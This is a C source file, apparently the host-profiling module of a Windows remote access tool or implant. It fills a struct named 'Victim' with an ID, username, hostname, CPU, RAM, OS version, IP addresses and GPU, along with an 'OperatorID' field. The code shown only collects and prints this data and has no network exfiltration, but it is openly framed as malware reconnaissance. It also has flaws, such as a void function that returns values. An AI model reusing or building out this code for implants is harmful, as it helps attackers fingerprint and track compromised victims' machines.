#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>
#include "Typedefs.h"

#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")

#pragma comment(lib, "user32.lib")

char get_rand_char() {
    char characters[] = "abcdefghijklmnopqrstuvwxyz0123456789";
    int random_index = rand() % (sizeof(characters) - 1);
    return characters[random_index];
}
/*
Recall
typedef struct {
    char ID[256];
    char DeviceName[256];
    char Username[256];
    char OperatorID[256];
    char CPUArchitecture[256];
    char GPUInfo[256];
    char RAMInfo[256];
    char OSName[256];
    char NetworkInfo[256];
    char CurrentDate[256];
} Victim;
*/
void information_gatherer(Victim* victim) {
    char random_string[11];

    srand(time(NULL));

    for (int i = 0; i < 10; i++) { // generate only 10 random characters
        random_string[i] = get_rand_char();
    }

    random_string[10] = '\0'; // Set the null terminator

    memcpy(victim->ID, random_string, 11);

    SYSTEM_INFO siSysInfo;

    GetSystemInfo(&siSysInfo);
    
    // Get Processor Architecture
    /*
    9 - AMD64
    5 - ARM
    12 - ARM64
    6 - Intel Itanium Based
    0 - x86
    0xffff - Unknown

    Source -> https://learn.microsoft.com/en-us/windows/win32/api/sysinfoapi/ns-sysinfoapi-system_info
    */
    switch (siSysInfo.wProcessorArchitecture) {
        case 9:  // AMD64
            memcpy(victim->CPUArchitecture, "AMD64", sizeof("AMD64"));
            break;
        case 5:  // ARM
            memcpy(victim->CPUArchitecture, "ARM", sizeof("ARM"));
            break;
        case 12:  // ARM64
            memcpy(victim->CPUArchitecture, "ARM64", sizeof("ARM64"));
            break;
        case 6:  // Intel Itanium Based
            memcpy(victim->CPUArchitecture, "Intel Itanium Based", sizeof("Intel Itanium Based"));
            break;
        case 0:  // x86
            memcpy(victim->CPUArchitecture, "x86", sizeof("x86"));
            break;
        case 0xFFFF:  // Unknown
            memcpy(victim->CPUArchitecture, "Unknown", sizeof("Unknown"));
            break;
    }

    MEMORYSTATUSEX memInfo;
    memInfo.dwLength = sizeof(MEMORYSTATUSEX);

    if (GlobalMemoryStatusEx(&memInfo)) {
        DWORDLONG totalPhysicalMemory = memInfo.ullTotalPhys / (1024 * 1024);
        sprintf(victim->RAMInfo, "%llu", totalPhysicalMemory);  // convert number to string
    }

    // For OSName
    OSVERSIONINFOA osInfo;
    ZeroMemory(&osInfo, sizeof(OSVERSIONINFOA));
    osInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);
    if (GetVersionExA(&osInfo)) {
        sprintf(victim->OSName, "Windows %d.%d", osInfo.dwMajorVersion, osInfo.dwMinorVersion);
    }

    // For NetworkInfo (This is a placeholder; obtaining full network info on Windows is non-trivial)
    strncpy(victim->NetworkInfo, "UNKNOWN", 256);

    // For CurrentDate
    time_t rawtime;
    struct tm * timeinfo;
    time(&rawtime);
    timeinfo = localtime(&rawtime);
    strftime(victim->CurrentDate, 256, "%Y-%m-%d %H:%M:%S", timeinfo);

    char username[256 + 1];
    DWORD username_len = 256 + 1;
    
    if (GetUserName(username, &username_len)) {
        memcpy(victim->Username, username, username_len);
    }

    char pc_hostname[256 + 1];
    DWORD pc_hostname_len = 256 + 1;

    if (GetComputerNameA(pc_hostname, &pc_hostname_len)) {
        memcpy(victim->DeviceName, pc_hostname, pc_hostname_len);
        victim->DeviceName[pc_hostname_len] = '\0';
    }

    strncpy(victim->OperatorID, "UNKNOWN", 256);

    strncpy(victim->GPUInfo, "UNKNOWN", 256);

    WSADATA wsaData;
    char ip_hostname[256];
    struct hostent *host_entry;
    int i;

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("WSAStartup failed, error code: %d\n", WSAGetLastError());
        return 1;
    }

    // Get the local hostname
    if (gethostname(ip_hostname, sizeof(ip_hostname)) == SOCKET_ERROR) {
        printf("gethostname failed, error code: %d\n", WSAGetLastError());
        return 1;
    }

    // Get the host info
    if ((host_entry = gethostbyname(ip_hostname)) == NULL) {
        printf("gethostbyname failed, error code: %d\n", WSAGetLastError());
        return 1;
    }

    char tempBuffer[256];  // Temporary buffer to hold each IP address
    int position = 0;  // Position to keep track of how many characters are in NetworkInfo so far
    int len;  // Length of the string to be added

    // Initialize the first part of the string
    len = snprintf(victim->NetworkInfo + position, 256 - position, "");
    position += len;  // Move the position forward by the length of the string added

    // Populate the list of IP addresses
    for (i = 0; host_entry->h_addr_list[i] != 0; ++i) {
        struct in_addr addr;
        memcpy(&addr, host_entry->h_addr_list[i], sizeof(struct in_addr));

        // Format the next IP address
        len = snprintf(tempBuffer, sizeof(tempBuffer), " %s", inet_ntoa(addr));

        // Check if we have enough space left in victim->NetworkInfo
        if (position + len < 256) {
            snprintf(victim->NetworkInfo + position, 256 - position, "%s", tempBuffer);
            position += len;  // Move the position forward by the length of the string added
        } else {
            // Not enough space left in victim->NetworkInfo
            printf("NetworkInfo buffer is full.\n");
            break;
        }
    }

    // Null-terminate the string just in case
    victim->NetworkInfo[255] = '\0';

    // Cleanup
    WSACleanup();

    HKEY hKey;
    char buffer[256];
    DWORD dwBufferSize = sizeof(buffer);
    DWORD dwType = 0;

    // Open the registry key
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Video\\{DEB039CC-B704-4F53-B43E-9DD4432FA2E9}\\0000", 0, KEY_QUERY_VALUE, &hKey) == ERROR_SUCCESS) {
        // Query the value
        if (RegQueryValueEx(hKey, "Device Description", 0, &dwType, (LPBYTE)buffer, &dwBufferSize) == ERROR_SUCCESS) {
            memcpy(victim->GPUInfo, buffer, dwBufferSize < sizeof(victim->GPUInfo) ? dwBufferSize : sizeof(victim->GPUInfo));
        } else {
            // If failed, set GPUInfo to "Unknown"
            strcpy(victim->GPUInfo, "Unknown");
        }

        // Close the registry key
        RegCloseKey(hKey);
    } else {
        // If failed, set GPUInfo to "Unknown"
        strcpy(victim->GPUInfo, "Unknown");
    }

    printf("ID: %s\n", victim->ID);
    printf("Device Name: %s\n", victim->DeviceName);
    printf("Username: %s\n", victim->Username);
    printf("Operator ID: %s\n", victim->OperatorID);
    printf("CPU Architecture: %s\n", victim->CPUArchitecture);
    printf("GPU Info: %s\n", victim->GPUInfo);
    printf("RAM Info (MB): %s\n", victim->RAMInfo);
    printf("OS Name: %s\n", victim->OSName);
    printf("Network Info: %s\n", victim->NetworkInfo);
    printf("Current Date: %s\n", victim->CurrentDate);
}